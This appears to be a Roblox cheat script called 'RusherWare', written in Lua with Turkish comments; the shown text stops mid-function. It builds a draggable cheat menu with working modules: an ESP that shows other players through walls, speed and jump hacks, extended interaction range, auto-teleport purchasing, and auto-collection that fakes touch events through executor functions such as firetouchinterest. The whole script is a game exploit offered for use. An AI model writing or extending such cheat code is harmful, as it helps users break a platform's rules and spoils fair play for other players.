local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ScreenGui oluştur
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = playerGui

-- ImageLabel oluştur
local imageLabel = Instance.new("ImageLabel")
imageLabel.Parent = screenGui
imageLabel.Size = UDim2.new(0, 300, 0, 300)
imageLabel.Position = UDim2.new(0.5, -150, -0.3, 0) -- yukarıdan başlasın
imageLabel.BackgroundTransparency = 0
imageLabel.Image = "rbxassetid://134803730453170"
imageLabel.ImageTransparency = 0

-- Aşağı inme animasyonu
local appearTween = TweenService:Create(
	imageLabel,
	TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
	{Position = UDim2.new(0.5, -150, 0.5, -150)}
)

appearTween:Play()
appearTween.Completed:Wait()

local Player = game.Players.LocalPlayer
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "benimiariyorsun"
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local Categories = {"COMBAT", "PLAYER", "MOVEMENT", "RENDER", "HUD"}
local CategoryFrames = {}

local ModuleProperties = {}

local OpenPropertyPanels = {}

-- Search bar oluşturma
local searchBox = Instance.new("TextBox")
searchBox.Size = UDim2.new(0, 200, 0, 26)
searchBox.Position = UDim2.new(0.5, -100, 0, 5) -- orta üst
searchBox.PlaceholderText = "Search..."
searchBox.Text = ""
searchBox.TextColor3 = Color3.fromRGB(255,255,255)
searchBox.BackgroundColor3 = Color3.fromRGB(60,60,60)
searchBox.Font = Enum.Font.Gotham
searchBox.TextSize = 14
searchBox.Parent = ScreenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0,6)
corner.Parent = searchBox

-- Arama fonksiyonu
searchBox:GetPropertyChangedSignal("Text"):Connect(function()
	local query = searchBox.Text:lower()
	for catName, frame in pairs(CategoryFrames) do
		for _, btn in ipairs(frame:GetChildren()) do
			if btn:IsA("TextButton") then
				if query == "" or btn.Text:lower():find(query) then
					btn.Visible = true
				else
					btn.Visible = false
				end
			end
		end
	end
end)


local function playSound(assetId)
	local sound = Instance.new("Sound")
	sound.SoundId = assetId
	sound.Volume = 1
	sound.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	sound:Play()
	sound.Ended:Connect(function()
		sound:Destroy()
	end)
end

local function openProperties(moduleName)
	-- Eğer panel açık ise kapat
	if OpenPropertyPanels[moduleName] then
		OpenPropertyPanels[moduleName]:Destroy()
		OpenPropertyPanels[moduleName] = nil
		return
	end

	local props = ModuleProperties[moduleName]
	if not props then return end

	local propFrame = Instance.new("Frame")
	propFrame.Size = UDim2.new(0, 220, 0, 200)
	propFrame.Position = UDim2.new(0.5, -110, 0.5, -100)
	propFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	propFrame.BorderSizePixel = 0
	propFrame.Parent = ScreenGui
	OpenPropertyPanels[moduleName] = propFrame  -- kaydet

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0,10)
	corner.Parent = propFrame

	-- Title Bar
	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1,0,0,30)
	title.Text = moduleName .. " Özellikleri"
	title.TextColor3 = Color3.fromRGB(255,255,255)
	title.BackgroundColor3 = Color3.fromRGB(180,20,20)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 16
	title.Parent = propFrame

	local titleCorner = Instance.new("UICorner")
	titleCorner.CornerRadius = UDim.new(0,10)
	titleCorner.Parent = title

	-- Draggable
	local dragging = false
	local dragInput, dragStart, startPos
	local function update(input)
		local delta = input.Position - dragStart
		propFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end

	title.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = propFrame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	title.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end)

	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)

	local layout = Instance.new("UIListLayout")
	layout.Parent = propFrame
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0,5)



	for _, feature in ipairs(props) do
		if feature.Type == "Slider" then
			local sliderFrame = Instance.new("Frame")
			sliderFrame.Size = UDim2.new(1, -10, 0, 30)
			sliderFrame.BackgroundColor3 = Color3.fromRGB(60,60,60)
			sliderFrame.Parent = propFrame

			local sliderCorner = Instance.new("UICorner")
			sliderCorner.CornerRadius = UDim.new(0,6)
			sliderCorner.Parent = sliderFrame

			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(0.4,0,1,0)
			label.Text = feature.Name
			label.TextColor3 = Color3.fromRGB(255,255,255)
			label.BackgroundTransparency = 1
			label.Font = Enum.Font.Gotham
			label.TextSize = 14
			label.Parent = sliderFrame

			local slider = Instance.new("TextBox")
			slider.Size = UDim2.new(0.5,0,1,0)
			slider.Position = UDim2.new(0.45,0,0,0)
			slider.Text = tostring(feature.Value)
			slider.BackgroundColor3 = Color3.fromRGB(80,80,80)
			slider.TextColor3 = Color3.fromRGB(255,255,255)
			slider.Parent = sliderFrame

			slider.FocusLost:Connect(function()
				local val = tonumber(slider.Text)
				if val then
					if val < feature.Min then val = feature.Min end
					if val > feature.Max then val = feature.Max end
					feature.Value = val
					slider.Text = tostring(val)
				end
			end)

		elseif feature.Type == "Boolean" then
			local boolBtn = Instance.new("TextButton")
			boolBtn.Size = UDim2.new(1, -10, 0, 26)
			boolBtn.BackgroundColor3 = feature.Value and Color3.fromRGB(100,100,100) or Color3.fromRGB(60,60,60)
			boolBtn.Text = feature.Name
			boolBtn.TextColor3 = Color3.fromRGB(255,255,255)
			boolBtn.Font = Enum.Font.Gotham
			boolBtn.TextSize = 14
			boolBtn.Parent = propFrame

			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0,6)
			corner.Parent = boolBtn

			boolBtn.MouseButton1Click:Connect(function()
				feature.Value = not feature.Value
				boolBtn.BackgroundColor3 = feature.Value and Color3.fromRGB(100,100,100) or Color3.fromRGB(60,60,60)
			end)
		elseif feature.Type == "Color" then
			local colorBtn = Instance.new("TextButton")
			colorBtn.Size = UDim2.new(1, -10, 0, 26)
			colorBtn.BackgroundColor3 = feature.Value
			colorBtn.Text = feature.Name
			colorBtn.TextColor3 = Color3.fromRGB(255,255,255)
			colorBtn.Font = Enum.Font.Gotham
			colorBtn.TextSize = 14
			colorBtn.Parent = propFrame

			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0,6)
			corner.Parent = colorBtn

			local pickerOpen = false
			local pickerFrame
			local rainbowEnabled = false -- Rainbow aktif mi?

			colorBtn.MouseButton1Click:Connect(function()
				if pickerOpen then
					pickerFrame:Destroy()
					pickerOpen = false
					return
				end
				pickerOpen = true

				-- Panel oluştur
				pickerFrame = Instance.new("Frame")
				pickerFrame.Size = UDim2.new(0, 200, 0, 130) -- biraz daha büyük çünkü rainbow için yer lazım
				pickerFrame.Position = UDim2.new(0, 0, 0, 30)
				pickerFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
				pickerFrame.Parent = propFrame

				local corner = Instance.new("UICorner")
				corner.CornerRadius = UDim.new(0,6)
				corner.Parent = pickerFrame

				local function createSlider(name, colorComponent)
					local sliderFrame = Instance.new("Frame")
					sliderFrame.Size = UDim2.new(1, -10, 0, 20)
					sliderFrame.Position = UDim2.new(0,5,0, (#pickerFrame:GetChildren()-1)*25)
					sliderFrame.BackgroundColor3 = Color3.fromRGB(60,60,60)
					sliderFrame.Parent = pickerFrame

					local sliderCorner = Instance.new("UICorner")
					sliderCorner.CornerRadius = UDim.new(0,4)
					sliderCorner.Parent = sliderFrame

					local label = Instance.new("TextLabel")
					label.Size = UDim2.new(0.3,0,1,0)
					label.Text = name
					label.TextColor3 = Color3.fromRGB(255,255,255)
					label.BackgroundTransparency = 1
					label.Font = Enum.Font.Gotham
					label.TextSize = 12
					label.Parent = sliderFrame

					local input = Instance.new("TextBox")
					input.Size = UDim2.new(0.65,0,1,0)
					input.Position = UDim2.new(0.32,0,0,0)
					input.Text = tostring(math.floor(feature.Value[colorComponent]*255))
					input.TextColor3 = Color3.fromRGB(255,255,255)
					input.BackgroundColor3 = Color3.fromRGB(80,80,80)
					input.Font = Enum.Font.Gotham
					input.TextSize = 12
					input.Parent = sliderFrame

					input.FocusLost:Connect(function()
						local val = tonumber(input.Text)
						if val then
							if val < 0 then val = 0 end
							if val > 255 then val = 255 end
							feature.Value = Color3.new(
								colorComponent=="R" and val/255 or feature.Value.R,
								colorComponent=="G" and val/255 or feature.Value.G,
								colorComponent=="B" and val/255 or feature.Value.B
							)
							colorBtn.BackgroundColor3 = feature.Value
							input.Text = tostring(val)
						end
					end)
				end

				createSlider("R","R")
				createSlider("G","G")
				createSlider("B","B")

				-- Rainbow toggle
				local rainbowBtn = Instance.new("TextButton")
				rainbowBtn.Size = UDim2.new(1,-10,0,20)
				rainbowBtn.Position = UDim2.new(0,5,0,(#pickerFrame:GetChildren()-1)*25)
				rainbowBtn.BackgroundColor3 = Color3.fromRGB(80,80,80)
				rainbowBtn.Text = "Rainbow: OFF"
				rainbowBtn.TextColor3 = Color3.fromRGB(255,255,255)
				rainbowBtn.Font = Enum.Font.Gotham
				rainbowBtn.TextSize = 12
				rainbowBtn.Parent = pickerFrame

				local btnCorner = Instance.new("UICorner")
				btnCorner.CornerRadius = UDim.new(0,4)
				btnCorner.Parent = rainbowBtn

				rainbowBtn.MouseButton1Click:Connect(function()
					rainbowEnabled = not rainbowEnabled
					rainbowBtn.Text = rainbowEnabled and "Rainbow: ON" or "Rainbow: OFF"
				end)
			end)

			-- Rainbow güncelleme
			game:GetService("RunService").RenderStepped:Connect(function()
				if rainbowEnabled then
					local t = tick()
					local r = math.sin(t*2)*0.5+0.5
					local g = math.sin(t*2 + 2)*0.5+0.5
					local b = math.sin(t*2 + 4)*0.5+0.5
					feature.Value = Color3.new(r,g,b)
					colorBtn.BackgroundColor3 = feature.Value
				end
			end)
		elseif feature.Type == "Mode" then
			local modeBtn = Instance.new("TextButton")
			modeBtn.Size = UDim2.new(1, -10, 0, 26)
			modeBtn.BackgroundColor3 = Color3.fromRGB(60,60,60)
			modeBtn.Text = feature.Name .. ": " .. feature.Value
			modeBtn.TextColor3 = Color3.fromRGB(255,255,255)
			modeBtn.Font = Enum.Font.Gotham
			modeBtn.TextSize = 14
			modeBtn.Parent = propFrame

			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0,6)
			corner.Parent = modeBtn

			modeBtn.MouseButton1Click:Connect(function()
				feature.Index = feature.Index + 1
				if feature.Index > #feature.Modes then feature.Index = 1 end
				feature.Value = feature.Modes[feature.Index]
				modeBtn.Text = feature.Name .. ": " .. feature.Value
			end)

		end
	end
end


local function addColor(moduleName, name, value)
	ModuleProperties[moduleName] = ModuleProperties[moduleName] or {}
	table.insert(ModuleProperties[moduleName], {Type="Color", Name=name, Value=value})
end

local function addSlider(moduleName, name, min, max, value)
	ModuleProperties[moduleName] = ModuleProperties[moduleName] or {}
	table.insert(ModuleProperties[moduleName], {Type="Slider", Name=name, Min=min, Max=max, Value=value})
end

local function addBoolean(moduleName, name, value)
	ModuleProperties[moduleName] = ModuleProperties[moduleName] or {}
	table.insert(ModuleProperties[moduleName], {Type="Boolean", Name=name, Value=value})
end

local function addMode(moduleName, name, modes, defaultIndex)
	ModuleProperties[moduleName] = ModuleProperties[moduleName] or {}
	table.insert(ModuleProperties[moduleName], {
		Type = "Mode",
		Name = name,
		Modes = modes,
		Index = defaultIndex or 1,
		Value = modes[defaultIndex or 1]
	})
end

-- Slider değerini al
local function getSlider(moduleName, featureName)
	local props = ModuleProperties[moduleName]
	if not props then return nil end
	for _, f in ipairs(props) do
		if f.Type == "Slider" and f.Name == featureName then
			return f.Value
		end
	end
	return nil
end

-- Boolean değerini al
local function getBoolean(moduleName, featureName)
	local props = ModuleProperties[moduleName]
	if not props then return nil end
	for _, f in ipairs(props) do
		if f.Type == "Boolean" and f.Name == featureName then
			return f.Value
		end
	end
	return nil
end

-- Color değerini al
local function getColor(moduleName, featureName)
	local props = ModuleProperties[moduleName]
	if not props then return nil end
	for _, f in ipairs(props) do
		if f.Type == "Color" and f.Name == featureName then
			return f.Value
		end
	end
	return nil
end

-- Mode değerini al
local function getMode(moduleName, featureName)
	local props = ModuleProperties[moduleName]
	if not props then return nil end
	for _, f in ipairs(props) do
		if f.Type == "Mode" and f.Name == featureName then
			return f.Value
		end
	end
	return nil
end

local NotifyContainer = Instance.new("Frame")
NotifyContainer.Size = UDim2.new(0, 250, 0, 0)
NotifyContainer.Position = UDim2.new(1, -10, 1, -10)  -- ekranın sağ altından 10px içeri
NotifyContainer.AnchorPoint = Vector2.new(1,1)         -- sağ alt köşe referans
NotifyContainer.BackgroundTransparency = 1
NotifyContainer.Parent = ScreenGui

local UIList = Instance.new("UIListLayout")
UIList.Parent = NotifyContainer
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.FillDirection = Enum.FillDirection.Vertical
UIList.Padding = UDim.new(0, 5)
UIList.HorizontalAlignment = Enum.HorizontalAlignment.Right
UIList.VerticalAlignment = Enum.VerticalAlignment.Bottom  -- önemli: aşağıdan yukarı



local function Notify(text, duration)
	duration = duration or 3
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, 0, 0, 40)
	frame.BackgroundColor3 = Color3.fromRGB(50,50,50)
	frame.BorderSizePixel = 0
	frame.Parent = NotifyContainer

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0,6)
	corner.Parent = frame

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, -10, 1, -10)
	label.Position = UDim2.new(0,5,0,5)
	label.Text = text
	label.TextColor3 = Color3.fromRGB(255,255,255)
	label.BackgroundTransparency = 1
	label.Font = Enum.Font.Gotham
	label.TextSize = 16
	label.TextWrapped = true
	label.Parent = frame

	frame.BackgroundTransparency = 1
	label.TextTransparency = 1
	game.TweenService:Create(frame, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
	game.TweenService:Create(label, TweenInfo.new(0.2), {TextTransparency = 0}):Play()

	delay(duration, function()
		local tweenFrame = game.TweenService:Create(frame, TweenInfo.new(0.2), {BackgroundTransparency = 1})
		local tweenText = game.TweenService:Create(label, TweenInfo.new(0.2), {TextTransparency = 1})
		tweenFrame:Play()
		tweenText:Play()
		tweenFrame.Completed:Connect(function()
			frame:Destroy()
		end)
	end)
end

local ToggleStates = {}

local function createCategoryWindow(name, position)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 220, 0, 280)
	frame.Position = position
	frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	frame.BorderSizePixel = 0
	frame.AnchorPoint = Vector2.new(0,0)
	frame.ClipsDescendants = true
	frame.Parent = ScreenGui

	local shadow = Instance.new("UICorner")
	shadow.CornerRadius = UDim.new(0, 10)
	shadow.Parent = frame

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, 0, 0, 28)

	local clickGUIProps = ModuleProperties["ClickGUI"]
	if clickGUIProps then
		for _, feature in ipairs(clickGUIProps) do
			if feature.Type == "Color" and feature.Name == "Kategori Rengi" then
				title.BackgroundColor3 = feature.Value
			end
		end
	end

	if not title.BackgroundColor3 then
		title.BackgroundColor3 = Color3.fromRGB(180, 20, 20)
	end

	title.Text = name
	title.TextColor3 = Color3.fromRGB(255,255,255)
	title.TextSize = 18
	title.Font = Enum.Font.GothamBold
	title.Parent = frame

	local titleCorner = Instance.new("UICorner")
	titleCorner.CornerRadius = UDim.new(0, 10)
	titleCorner.Parent = title

	local dragging = false
	local dragInput, dragStart, startPos
	local function update(input)
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end

	title.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	title.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end)


	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)

	local layout = Instance.new("UIListLayout")
	layout.Parent = frame
	layout.Padding = UDim.new(0,5)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.FillDirection = Enum.FillDirection.Vertical

	return frame
end

for i, cat in ipairs(Categories) do
	local pos = UDim2.new(0.05 + (i-1)*0.19, 0, 0.15, 0)
	CategoryFrames[cat] = createCategoryWindow(cat, pos)
end

local function createToggle(name, category, callback)
	local frame = CategoryFrames[category]
	if not frame then
		warn("Kategori bulunamadı:", category)
		return
	end

	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 26)
	btn.Position = UDim2.new(0,1,0,0)
	btn.Text = name
	btn.BackgroundColor3 = Color3.fromRGB(60,60,60)
	btn.TextColor3 = Color3.fromRGB(255,255,255)
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 16
	btn.AutoButtonColor = false
	btn.Parent = frame

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0,6)
	corner.Parent = btn

	local state = false
	ToggleStates[name] = state

	btn.MouseEnter:Connect(function()
		btn.BackgroundColor3 = state and Color3.fromRGB(100,100,100) or Color3.fromRGB(75,75,75)
	end)
	btn.MouseLeave:Connect(function()
		btn.BackgroundColor3 = state and Color3.fromRGB(100,100,100) or Color3.fromRGB(60,60,60)
	end)

	btn.MouseButton1Click:Connect(function()
		state = not state
		ToggleStates[name] = state
		btn.BackgroundColor3 = state and Color3.fromRGB(100,100,100) or Color3.fromRGB(60,60,60)
		if callback then callback(state) end
		local notifyColor = state and Color3.fromRGB(0,255,0) or Color3.fromRGB(255,0,0)
		Notify(name .. (state and " on!" or " off!"), 3, notifyColor)
		playSound("rbxassetid://15675059323")
	end)

end

local player = game.Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

local watermarkGui = Instance.new("ScreenGui")
watermarkGui.Name = "WatermarkGui"
watermarkGui.ResetOnSpawn = false
watermarkGui.Parent = PlayerGui

local watermarkLabel = Instance.new("TextLabel")
watermarkLabel.Size = UDim2.new(0, 400, 0, 100)
watermarkLabel.Position = UDim2.new(1, -310, 0, -78)
watermarkLabel.BackgroundTransparency = 1
watermarkLabel.Text = "RusherWare"
watermarkLabel.TextSize = 30
watermarkLabel.Font = Enum.Font.SourceSansBold
watermarkLabel.Visible = false
watermarkLabel.Parent = watermarkGui

addColor("Watermark", "Color", Color3.fromRGB(255,0,0))

local function isToggleActive(name)
	return ToggleStates[name] or false
end

createToggle("ESP", "RENDER", function(on)
	print("ESP:", on)
end)

createToggle("Watermark", "HUD", function(on)
	if on then
		watermarkLabel.Visible = true
	else
		watermarkLabel.Visible = false
	end
end)

local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function()
	if isToggleActive("Watermark") then
		watermarkLabel.TextColor3 = getColor("Watermark", "Color")
	end
end)

createToggle("Speed", "MOVEMENT", function(on)
	local player = game.Players.LocalPlayer
	if on then
		player.Character.Humanoid.WalkSpeed = getSlider("Speed", "Speed")
	else
		player.Character.Humanoid.WalkSpeed = 16
	end
end)


createToggle("Max Intract", "PLAYER", function(on)
	local player = game.Players.LocalPlayer
	if not player then return end
	local char = player.Character or player.CharacterAdded:Wait()

	if on then
		print("[Max Intract] ✅ Aktif — ProximityPrompt mesafesi artırılıyor...")

		local tycoonsFolder = workspace:FindFirstChild("Tycoons")
		if not tycoonsFolder then
			warn("[Max Intract] Tycoons klasörü bulunamadı!")
			return
		end

		for _, tycoon in ipairs(tycoonsFolder:GetChildren()) do
			-- Owner attribute'u kontrol et
			local ownerName = tycoon:GetAttribute("Owner")
			if ownerName == player.Name then
				-- Dropper1 → Click Dropper 1 → Bui → Dropper → Dropper → Trigger → ProximityPrompt yolunu bul
				local dropper1 = tycoon:FindFirstChild("Dropper1")
				if not dropper1 then continue end

				local clickDropper = dropper1:FindFirstChild("Click Dropper 1")
				if not clickDropper then continue end

				local bui = clickDropper:FindFirstChild("bui")
				if not bui then continue end

				local dropperFolder = bui:FindFirstChild("Dropper")
				if not dropperFolder then continue end

				local innerDropper = dropperFolder:FindFirstChild("Dropper")
				if not innerDropper then continue end

				local trigger = innerDropper:FindFirstChild("Trigger")
				if not trigger then continue end

				local prompt = trigger:FindFirstChildOfClass("ProximityPrompt")
				if prompt then
					prompt.MaxActivationDistance = 500
					print("[Max Intract] 🔥 Mesafe 500 olarak ayarlandı:", prompt:GetFullName())
				else
					warn("[Max Intract] ProximityPrompt bulunamadı!")
				end
			end
		end
	else
		print("[Max Intract] ⛔ Devre dışı — değişiklik yapılmadı.")
	end
end)

createToggle("Auto Buy", "PLAYER", function(on)
	local player = game.Players.LocalPlayer
	if not player then return end
	local char = player.Character or player.CharacterAdded:Wait()

	if on then
		print("[AutoTP] ✅ Aktif edildi — uygun fiyatlı Dropper veya Base kısmına ışınlama aktif.")

		local function parseCash(str)
			if type(str) == "number" then return str end
			if type(str) ~= "string" then return nil end
			str = str:gsub("[%$,]", "")
			local num = tonumber(str)
			if not num then
				local base, suffix = str:match("(%d+%.?%d*)([kmb])")
				if base then
					num = tonumber(base)
					if suffix == "k" then num = num * 1_000 end
					if suffix == "m" then num = num * 1_000_000 end
					if suffix == "b" then num = num * 1_000_000_000 end
				end
			end
			return num
		end

		local function teleportTo(position)
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if hrp then
				hrp.CFrame = CFrame.new(position + Vector3.new(0, 3, 0))
			end
		end

		task.spawn(function()
			while on do
				local tycoons = workspace:FindFirstChild("Tycoons")
				if not tycoons then
					warn("[AutoTP] Tycoons klasörü bulunamadı.")
					task.wait(0.1)
					continue
				end

				local leaderstats = player:FindFirstChild("leaderstats")
				if not leaderstats then
					task.wait(0.1)
					continue
				end

				local cashVal = leaderstats:FindFirstChild("Cash")
				if not cashVal then
					task.wait(0.1)
					continue
				end

				local cash = tonumber(cashVal.Value)
				if not cash then
					task.wait(0.1)
					continue
				end

				for _, tycoon in ipairs(tycoons:GetChildren()) do
					local ownerAttr = tycoon:GetAttribute("Owner")
					if ownerAttr == player.Name then
						local checkFolders = {}

						-- Dropper1 ve Base klasörlerini ekle
						local dropper1 = tycoon:FindFirstChild("Dropper1")
						local baseFolder = tycoon:FindFirstChild("Base")

						if dropper1 then table.insert(checkFolders, dropper1) end
						if baseFolder then table.insert(checkFolders, baseFolder) end

						for _, folder in ipairs(checkFolders) do
							for _, descendant in ipairs(folder:GetDescendants()) do
								if descendant:IsA("TextLabel") and descendant.Name == "Cost" then
									local costText = descendant.Text
									local cost = parseCash(costText)
									if cost and cost < cash then
										print(string.format("[AutoTP] 💸 %s uygun bulundu ($%.0f < $%.0f)", descendant:GetFullName(), cost, cash))

										local parentModel = descendant:FindFirstAncestorWhichIsA("Model") or descendant.Parent
										if parentModel and parentModel:IsA("Model") and parentModel.PrimaryPart then
											teleportTo(parentModel.PrimaryPart.Position)
										else
											local part = parentModel:FindFirstChildWhichIsA("BasePart")
											if part then teleportTo(part.Position) end
										end

										task.wait(0.5)
										break
									end
								end
							end
						end
					end
				end

				task.wait(0.5)
			end
		end)
	else
		print("[AutoTP] ⛔ Devre dışı bırakıldı.")
	end
end)


createToggle("Auto Collect", "PLAYER", function(on)
    local Players = game:GetService("Players")
    local lp = Players.LocalPlayer
    local char = lp.Character or lp.CharacterAdded:Wait()

    local function fireTouch(part)
        if not part:IsA("Part") then return end
        for _, ti in ipairs(part:GetChildren()) do
            if ti:IsA("TouchTransmitter") or ti:IsA("TouchInterest") then
                for _, myPart in ipairs(char:GetDescendants()) do
                    if myPart:IsA("Part") then
                        firetouchinterest(myPart, part, 0)
                        task.wait()
                        firetouchinterest(myPart, part, 1)
                    end
                end
                return true
            end
        end
        return false
    end

    if on then
        getgenv().AutoCollect = true
        print("[AutoCollect] ✅ Aktif edildi.")

        task.spawn(function()
            while getgenv().AutoCollect and task.wait(2) do
                for _, tycoon in pairs(workspace:WaitForChild("Tycoons"):GetChildren()) do
                    if tycoon:GetAttribute("Owner") == lp.Name then
                        local base = tycoon:FindFirstChild("Base")
                        if base then
                            local atm1 = base:FindFirstChild("ATM 1")
                            if atm1 then
                                local bui = atm1:FindFirstChild("bui")
                                if bui then
                                    local atm = bui:FindFirstChild("ATM")
                                    if atm then
                                        local collectPart = atm:FindFirstChild("CollectPart")
                                        if collectPart then
                                            local success = fireTouch(collectPart)
                                            if success then
                                                print(string.format("[AutoCollect] 💰 Para toplandı (%s)", tycoon.Name))
                                            else
                                                print(string.format("[AutoCollect] ⚠️ TouchInterest bulunamadı (%s)", collectPart:GetFullName()))
                                            end
                                        else
                                            print(string.format("[AutoCollect] ⚠️ CollectPart bulunamadı (%s)", atm:GetFullName()))
                                        end
                                    else
                                        print(string.format("[AutoCollect] ⚠️ ATM bulunamadı (%s)", bui:GetFullName()))
                                    end
                                else
                                    print(string.format("[AutoCollect] ⚠️ bui bulunamadı (%s)", atm1:GetFullName()))
                                end
                            else
                                print(string.format("[AutoCollect] ⚠️ ATM 1 bulunamadı (%s)", base:GetFullName()))
                            end
                        else
                            print(string.format("[AutoCollect] ⚠️ Base bulunamadı (%s)", tycoon:GetFullName()))
                        end
                    end
                end
            end
        end)
    else
        getgenv().AutoCollect = false
        print("[AutoCollect] ❌ Devre dışı bırakıldı.")
    end
end)










local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function()
	if isToggleActive("Speed") then
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = getSlider("Speed", "Speed")
	end
end)

createToggle("HighJump", "MOVEMENT", function(on)
	local player = game.Players.LocalPlayer
	if on then
		player.Character.Humanoid.JumpHeight = getSlider("HighJump", "Power")
	else
		player.Character.Humanoid.JumpHeight = 16
	end
end)

local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function()
	if isToggleActive("HighJump") then
		game.Players.LocalPlayer.Character.Humanoid.JumpHeight = getSlider("HighJump", "Power")
	end
end)

addSlider("Speed", "Speed",20,25,25)
addSlider("HighJump", "Power",20,100,30)
addColor("ESP", "ESP Color", Color3.fromRGB(255,0,0))
addMode("ESP", "Mode", {"Box"}, 1)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local ESPs = {}

local function removeESP(player)
	local esp = ESPs[player]
	if esp then
		if typeof(esp) == "table" then
			for _, part in pairs(esp) do
				part:Destroy()
			end
		else
			esp:Destroy()
		end
		ESPs[player] = nil
	end
end

local function createESP(player)
	removeESP(player) -- varsa sil

	if not player.Character then return end
	local hrp = player.Character:WaitForChild("HumanoidRootPart", 5)
	local humanoid = player.Character:WaitForChild("Humanoid", 5)
	if not hrp or not humanoid then return end

	local box = Instance.new("BoxHandleAdornment")
	box.Adornee = hrp
	box.Size = Vector3.new(2, humanoid.HipHeight * 2 + 2, 2)
	box.ZIndex = 0
	box.AlwaysOnTop = true
	box.Transparency = 0.2
	box.Parent = hrp

	ESPs[player] = box

	-- ölünce temizle
	humanoid.Died:Connect(function()
		removeESP(player)
	end)
end

-- Render loop
RunService.RenderStepped:Connect(function()
	if isToggleActive("ESP") then
		for _, player in pairs(Players:GetPlayers()) do
			if player ~= Players.LocalPlayer then
				if not ESPs[player] then
					createESP(player)
				else
					local color = getColor("ESP", "ESP Color") or Color3.fromRGB(255,0,0)
					local esp = ESPs[player]
					if esp and esp:IsA("BoxHandleAdornment") then
						esp.Color3 = color
					end
				end
			end
		end
	else
		for _, player in pairs(Players:GetPlayers()) do
			removeESP(player)
		end
	end
end)

-- Oyuncu yeniden doğduğunda ESP ekle
Players.PlayerAdded:Connect(function(player)
	player.CharacterAdded:Connect(function(char)
		task.defer(function()
			if isToggleActive("ESP") then
				createESP(player)
			end
		end)
	end)
end)

-- Oyuncu çıkınca temizle
Players.PlayerRemoving:Connect(function(player)
	removeESP(player)
end)

-- İlkten var olan oyunculara bağlan
for _, player in ipairs(Players:GetPlayers()) do
	if player ~= Players.LocalPlayer then
		if player.Character then
			createESP(player)
		end
		player.CharacterAdded:Connect(function()
			task.defer(function()
				if isToggleActive("ESP") then
					createESP(player)
				end
			end)
		end)
	end
end




-- Sağ tık ile panel açma
for modName,_ in pairs(CategoryFrames) do
	local frame = CategoryFrames[modName]
	for _, child in ipairs(frame:GetChildren()) do
		if child:IsA("TextButton") then
			child.MouseButton2Click:Connect(function()
				openProperties(child.Text)
			end)
		end
	end
end

-- ClickGUI Button
local clickGUIButton = Instance.new("ImageButton")
clickGUIButton.Size = UDim2.new(0, 80, 0, 80)
clickGUIButton.Position = UDim2.new(0.9, 0, 0.05, 0)
clickGUIButton.Image = "rbxassetid://134803730453170"
clickGUIButton.BackgroundTransparency = 1
clickGUIButton.Parent = ScreenGui

-- Yuvarlatılmış köşeler
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0,12)  -- köşe yarıçapı 12px
corner.Parent = clickGUIButton

-- UIAspectRatioConstraint
local aspect = Instance.new("UIAspectRatioConstraint")
aspect.AspectRatio = 1
aspect.Parent = clickGUIButton

-- Draggable
local dragging = false
local dragInput, dragStart, startPos
local function update(input)
	local delta = input.Position - dragStart
